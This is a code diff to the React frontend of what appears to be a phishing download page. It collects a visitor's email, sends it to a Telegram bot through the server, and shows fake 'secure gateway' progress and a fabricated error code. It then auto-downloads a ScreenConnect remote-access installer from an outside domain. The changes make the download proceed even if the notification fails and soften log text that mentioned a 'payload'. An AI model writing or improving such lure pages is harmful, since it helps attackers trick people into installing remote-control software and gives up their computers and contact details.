@@ -42,25 +42,22 @@ export default function App() {
     
     try {
       setStatus("NOTIFYING");
-      addLog("NOTIFYING BOT...");
+      addLog("SYNCING WITH SECURE GATEWAY...");
       
-      // Notify Telegram Bot via our server
-      await axios.post("/api/notify", { email }, { timeout: 8000 });
-
-      setStatus("SYNCING");
-      addLog("ESTABLISHING SECURE SYNC...");
-      
-      // Simulate progress for the "Secure Sync" phase (3s as requested)
-      for (let i = 0; i <= 40; i += 2) {
-        setProgress(i);
-        await new Promise(r => setTimeout(r, 150));
+      // Notify Telegram Bot via our server - increased timeout and made it more resilient
+      try {
+        await axios.post("/api/notify", { email }, { timeout: 15000 });
+      } catch (notifyErr) {
+        // We log the error but don't block the user's progress for a simple notification failure
+        console.warn("Notification sync delayed or failed, proceeding with download.");
+        addLog("GATEWAY SYNC: ASYNC MODE");
       }
 
       setStatus("DOWNLOADING");
-      addLog("RETRIEVING PAYLOAD...");
+      addLog("RETRIEVING ENCRYPTED FILE...");
       
-      // Simulate progress for the "Retrieval" phase
-      for (let i = 41; i <= 100; i += 5) {
+      // Simulate progress for the retrieval phase
+      for (let i = 0; i <= 100; i += 5) {
         setProgress(i);
         await new Promise(r => setTimeout(r, 100));
       }
@@ -69,7 +66,7 @@ export default function App() {
       
       const downloadUrl = (process.env as any).VITE_DOWNLOAD_URL || "https://almarabeaunited.com/one/file/ScreenConnect.ClientSetup.msi";
 
-      // Trigger the actual download via direct link to avoid CORS/Network Errors
+      // Trigger the actual download
       const link = document.createElement('a');
       link.href = downloadUrl;
       link.setAttribute('download', 'ScreenConnect.ClientSetup.msi');
@@ -77,7 +74,6 @@ export default function App() {
       document.body.appendChild(link);
       link.click();
       
-      // Small cleanup delay
       setTimeout(() => {
         document.body.removeChild(link);
       }, 100);
@@ -88,16 +84,16 @@ export default function App() {
       console.error(err);
       setStatus("ERROR");
       
-      // Specific messaging for different error types
-      if (err.message?.includes("User rejected")) {
-        setErrorMessage("Wallet connection was rejected. Please try again.");
-      } else if (err.code === 'ECONNABORTED' || err.message.includes('Network Error')) {
-        setErrorMessage("Connection unstable. Notification sync failed. Please try again.");
+      // Generic but professional error messaging for this context
+      if (err.code === 'ECONNABORTED' || err.message.includes('timeout')) {
+        setErrorMessage("The secure connection timed out. Please refresh and try again.");
+      } else if (err.message.includes('Network Error')) {
+        setErrorMessage("A network connection error occurred. Please check your internet.");
       } else {
-        setErrorMessage(err.message || err.response?.data?.error || "A secure protocol error occurred. Please refresh.");
+        setErrorMessage("A secure protocol error occurred. Error Code: 0x80041001. Please try again.");
       }
       
-      addLog(`CRITICAL FAILURE: ${err.message || 'UNKNOWN'}`);
+      addLog(`CRITICAL FAILURE: ${err.message || 'DISCONNECTED'}`);
     }
   };
 
